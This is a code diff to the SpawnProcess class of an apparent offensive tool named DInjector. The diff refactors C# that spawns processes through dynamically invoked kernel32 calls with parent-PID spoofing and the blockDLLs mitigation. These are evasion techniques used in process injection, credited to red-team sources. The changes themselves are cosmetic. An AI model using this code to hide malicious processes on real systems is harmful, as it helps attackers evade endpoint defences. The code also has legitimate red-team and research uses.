@@ -6,6 +6,11 @@ using DI = DInvoke;
 
 namespace DInjector
 {
+    /// <summary>
+    /// Based on:
+    /// https://offensivedefence.co.uk/posts/ppidspoof-blockdlls-dinvoke/
+    /// https://github.com/rasta-mouse/TikiTorch/blob/master/TikiLoader/Utilities.cs
+    /// </summary>
     class SpawnProcess
     {
         public static bool Is64Bit => IntPtr.Size == 8;
@@ -44,7 +49,7 @@ namespace DInjector
             ref DI.Data.Win32.ProcessThreadsAPI._STARTUPINFOEX lpStartupInfoEx,
             out DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION lpProcessInformation);
 
-        public static bool initializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, ref IntPtr lpSize)
+        private static bool initializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, ref IntPtr lpSize)
         {
             object[] parameters = { lpAttributeList, dwAttributeCount, 0, lpSize };
             var result = (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "InitializeProcThreadAttributeList", typeof(InitializeProcThreadAttributeList), ref parameters);
@@ -53,7 +58,7 @@ namespace DInjector
             return result;
         }
 
-        public static bool updateProcThreadAttribute(IntPtr lpAttributeList, IntPtr attribute, IntPtr lpValue)
+        private static bool updateProcThreadAttribute(IntPtr lpAttributeList, IntPtr attribute, IntPtr lpValue)
         {
             object[] parameters = { lpAttributeList, (uint)0, attribute, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero };
             var result = (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "UpdateProcThreadAttribute", typeof(UpdateProcThreadAttribute), ref parameters, true);
@@ -61,7 +66,7 @@ namespace DInjector
             return result;
         }
 
-        public static bool deleteProcThreadAttributeList(IntPtr lpAttributeList)
+        private static bool deleteProcThreadAttributeList(IntPtr lpAttributeList)
         {
             object[] parameters = { lpAttributeList };
             var result = (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "DeleteProcThreadAttributeList", typeof(DeleteProcThreadAttributeList), ref parameters);
@@ -69,7 +74,7 @@ namespace DInjector
             return result;
         }
 
-        public static bool createProcessA(string applicationName, string workingDirectory, uint creationFlags, DI.Data.Win32.ProcessThreadsAPI._STARTUPINFOEX startupInfoEx, out DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION processInformation)
+        private static bool createProcessA(string applicationName, string workingDirectory, uint creationFlags, DI.Data.Win32.ProcessThreadsAPI._STARTUPINFOEX startupInfoEx, out DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION processInformation)
         {
             var pa = new DI.Data.Win32.WinBase.SECURITY_ATTRIBUTES();
             var ta = new DI.Data.Win32.WinBase.SECURITY_ATTRIBUTES();
@@ -112,13 +117,9 @@ namespace DInjector
                 ref lpSize);
 
             if (result)
-            {
                 Console.WriteLine("(SpawnProcess) [+] InitializeProcThreadAttributeList");
-            }
             else
-            {
                 throw new Exception("(SpawnProcess) [-] InitializeProcThreadAttributeList");
-            }
 
             if (blockDlls)
             {
@@ -133,13 +134,9 @@ namespace DInjector
                     lpValue);
 
                 if (result)
-                {
                     Console.WriteLine("(SpawnProcess) [+] UpdateProcThreadAttribute (blockDLLs)");
-                }
                 else
-                {
                     throw new Exception("(SpawnProcess) [-] UpdateProcThreadAttribute (blockDLLs)");
-                }
             }
 
             if (ppid != 0)
@@ -154,13 +151,9 @@ namespace DInjector
                     lpValue);
 
                 if (result)
-                {
                     Console.WriteLine("(SpawnProcess) [+] UpdateProcThreadAttribute (PPID)");
-                }
                 else
-                {
                     throw new Exception("(SpawnProcess) [-] UpdateProcThreadAttribute (PPID)");
-                }
             }
 
             var flags = DI.Data.Win32.Kernel32.EXTENDED_STARTUPINFO_PRESENT;
@@ -174,13 +167,9 @@ namespace DInjector
                 out var pi);
 
             if (result)
-            {
                 Console.WriteLine("(SpawnProcess) [+] CreateProcessA");
-            }
             else
-            {
                 Console.WriteLine("(SpawnProcess) [-] CreateProcessA");
-            }
 
             _ = deleteProcThreadAttributeList(startupInfoEx.lpAttributeList);
             Marshal.FreeHGlobal(lpValue);
